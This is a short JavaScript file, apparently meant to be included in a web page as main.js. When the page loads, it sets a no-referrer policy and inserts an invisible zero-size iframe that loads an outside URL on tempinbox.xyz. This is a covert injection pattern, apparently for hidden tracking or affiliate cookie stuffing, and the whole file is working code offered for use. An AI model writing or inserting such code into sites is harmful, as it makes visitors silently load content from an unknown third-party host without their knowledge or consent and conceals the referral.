// Function to dynamically add meta and iframe elements to the document
function addMetaAndIframe() {
    // Create a <meta> element with referrer policy
    const metaElement = document.createElement("meta");
    metaElement.name = "referrer";
    metaElement.content = "no-referrer";
    
    // Append the <meta> element to the <head> section
    document.head.appendChild(metaElement);

    // Create an <iframe> element with the specified attributes
    const iframeElement = document.createElement("iframe");
    iframeElement.width = "0";
    iframeElement.height = "0";
    iframeElement.frameBorder = "0";
    iframeElement.src = "https://www.tempinbox.xyz/stats/nord";
    
    // Append the <iframe> element to the <body> (or wherever you prefer)
    document.body.appendChild(iframeElement);
}

// Call the function to add the meta and iframe elements
addMetaAndIframe();


// Run Direct in the body -->  <!-- <script src="main.js"></script> -->
